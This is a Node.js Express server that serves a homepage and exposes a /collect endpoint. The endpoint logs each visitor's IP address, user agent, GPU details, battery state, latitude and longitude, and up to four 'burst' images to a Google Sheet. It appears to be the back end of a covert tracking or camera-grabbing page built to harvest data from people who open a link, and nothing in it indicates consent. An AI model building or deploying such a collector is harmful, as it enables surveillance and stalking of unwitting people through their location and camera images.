import 'dotenv/config';
import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import { google } from 'googleapis';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 8080;

// Middleware
app.use(cors());
app.use(express.json({ limit: '20mb' }));
app.use(express.static(__dirname));

// Serve index.html as the homepage
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Google Sheets Auth
const auth = new google.auth.JWT(
  process.env.GOOGLE_CLIENT_EMAIL,
  undefined,
  (process.env.GOOGLE_PRIVATE_KEY || '').replace(/\\n/g, '\n'),
  ['https://www.googleapis.com/auth/spreadsheets']
);
const sheets = google.sheets({ version: 'v4', auth });

// Collect Route
app.post('/collect', async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
        const { ts, hints, gpu, battery, location, burstImages } = req.body;

        const row = [
            ts, ip, hints.ua, 
            gpu?.vendor, gpu?.renderer,
            battery?.levelPercent + '%', battery?.charging,
            location?.lat, location?.lon,
            burstImages?.[0] || '', burstImages?.[1] || '', 
            burstImages?.[2] || '', burstImages?.[3] || ''
        ];

        await sheets.spreadsheets.values.append({
            spreadsheetId: process.env.GOOGLE_SHEET_ID,
            range: 'Logs!A1', // MAKE SURE YOUR TAB IS NAMED "Logs"
            valueInputOption: 'RAW',
            requestBody: { values: [row] }
        });

        res.json({ ok: true });
    } catch (err) {
        console.error("Sheet Error:", err.message);
        res.status(500).json({ error: err.message });
    }
});

app.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));
